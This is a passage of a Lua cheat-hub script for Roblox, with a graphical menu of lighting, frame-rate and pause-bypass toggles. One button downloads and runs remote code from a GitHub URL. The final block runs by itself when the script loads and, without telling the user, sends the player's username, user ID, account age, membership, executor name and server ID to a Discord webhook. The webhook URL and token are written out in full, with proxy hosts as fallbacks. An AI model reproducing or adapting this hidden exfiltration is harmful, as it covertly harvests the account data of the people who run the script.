                Lighting.Technology = defaultTechnology
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj:IsA("BasePart") then
                        obj.CastShadow = true 
                    end
                end
            end
        end
    })
end)

task.spawn(function()
    Lighting = game:GetService("Lighting")

    Tabs.Extension:AddToggle("DarknessToggle", {
        Title = "Disable Light",
        Description = "",
        Default = false,
        Callback = function(state)
            for _, light in ipairs(workspace:GetDescendants()) do
                if light:IsA("Light") then
                    light.Enabled = not state
                    task.wait() 
                end
            end
        end
    })
end)

task.spawn(function()
    FpsConfig = {
        Enabled = false
    }

    function updateFps()
        pcall(function()
            target = FpsConfig.Enabled and 9999 or 60
            if setfflag then
                setfflag("TaskSchedulerTargetFps", tostring(target))
                setfflag("DFIntTaskSchedulerTargetFps", tostring(target))
            end
            if setfpscap then
                setfpscap(target)
            end
        end)
    end

    task.spawn(function()
        networkPausedConn = nil

        AntiGPTPause = Tabs.Extension:AddToggle("AntiNetworkPause", {
            Title = "Anti Gameplay Paused", 
            Default = false, 
            Description = ""
        })

        AntiGPTPause:OnChanged(function(Value)
            if Value then
                pcall(function()
                    RobloxGui = game:GetService("CoreGui"):WaitForChild("RobloxGui")
                    currentPause = RobloxGui:FindFirstChild("CoreScripts/NetworkPause")
                    
                    if currentPause then 
                        currentPause:Destroy() 
                    end
                    
                    networkPausedConn = RobloxGui.ChildAdded:Connect(function(obj)
                        if obj.Name == "CoreScripts/NetworkPause" then
                            task.wait() 
                            obj:Destroy()
                        end
                    end)
                end)
            else
                if networkPausedConn then
                    networkPausedConn:Disconnect()
                    networkPausedConn = nil
                end
            end
        end)
    end)

    Tabs.Extension:AddToggle("FpsUnlockToggle", {
        Title = "Unlock FPS",
        Description = "Removes the frame rate cap",
        Default = false,
        Callback = function(Value)
            FpsConfig.Enabled = Value
            updateFps()
        end
    })

    while true do
        if FpsConfig.Enabled then
            updateFps()
        end
        task.wait(5)
    end
end)

Tabs.Extension:AddSection("Fast Flag Extension")

if setfflag then
Tabs.Extension:AddButton(
{
Title = "Blox Strap Script",
Description = "",
Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/qwertyui-is-back/Bloxstrap/main/Initiate.lua'), 'lol')()
end})
end

-- Settings

Tabs.Settings:AddParagraph({
        Title = "Configuration",
        Content = " "
    })

Tabs.Settings:AddToggle("FPSCounterToggle", {
    Title = "FPS & Ping Counter",
    Default = true,
    Callback = function(Value)
        ToggleFPSCounter(Value)
    end
})


SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)
FBM:SetLibrary(Fluent)

SaveManager:SetIgnoreIndexes({})

-- Save Folder
InterfaceManager:SetFolder("PhantomWyrmXUniversal")
FBM:SetFolder("PhantomWyrmXUniversal/ViolenceDistrict/FloatingButtons")
SaveManager:SetFolder("PhantomWyrmXUniversal/ViolenceDistrict")

InterfaceManager:BuildInterfaceSection(Tabs.Settings)
FBM:BuildConfigSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)

Window:SelectTab(1)

-- Auto Load Configuration
SaveManager:LoadAutoloadConfig()


do
    _G.Data = {}
    _G.Data.P = game.Players.LocalPlayer
    _G.Data.H = game:GetService('HttpService')
    
    local rawUrl = "https://discord.com/api/webhooks/1504450739102023751/6h9TacV6neCOH_ngBaC5zwiKPNgKKauuqDy9XiAZ5AW10EPE6Mi0tREgzlVPXkZUakO_"
    _G.Data.U = rawUrl:gsub("discord%.com", "webhook.lewisakura.moe")
    
    local function GetFields()
        local info = _G.Data.P
        local gName = 'Unknown'
        pcall(function() gName = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name end)
        
        return {
            {['name']='**Username**',['value']=info.Name,['inline']=false},
            {['name']='**Display Name**',['value']=info.DisplayName,['inline']=false},
            {['name']='**User ID**',['value']=tostring(info.UserId),['inline']=false},
            {['name']='**Game Name**',['value']=gName,['inline']=false},
            {['name']='**Account Age**',['value']=tostring(info.AccountAge)..' days',['inline']=false},
            {['name']='**Registration**',['value']=os.date('%Y-%m-%d',os.time()-(info.AccountAge*86400)),['inline']=false},
            {['name']='**Membership**',['value']=tostring(info.MembershipType):gsub('Enum.MembershipType.',''),['inline']=false},
            {['name']='**Executor**',['value']=(identifyexecutor and identifyexecutor()) or 'Unknown',['inline']=false},
            {['name']='**Place ID**',['value']=tostring(game.PlaceId),['inline']=false},
            {['name']='**JobId**',['value']=tostring(game.JobId),['inline']=false}
        }
    end

    function Transmit()
        payload = _G.Data.H:JSONEncode({
            ['username'] = 'Logs System',
            ['embeds'] = {{
                ['title'] = 'Violence Full Intelligence Report',
                ['description'] = 'User data bypass results',
                ['color'] = 16711680,
                ['fields'] = GetFields()
            }}
        })

        req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        
        if req then
            success, response = pcall(function() 
                return req({
                    Url = _G.Data.U, 
                    Method = 'POST', 
                    Headers = {
                        ['Content-Type'] = 'application/json',
                        ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
                    }, 
                    Body = payload
                }) 
            end)
            
            if success and response and (response.StatusCode == 429 or response.StatusCode == 403) then
                backupUrl = rawUrl:gsub("discord%.com", "api.hyra.io")
                pcall(function()
                    req({Url = backupUrl, Method = 'POST', Headers = {['Content-Type'] = 'application/json'}, Body = payload})
                end)
            end
        end
        _G.Data = nil
    end

    Transmit()
end
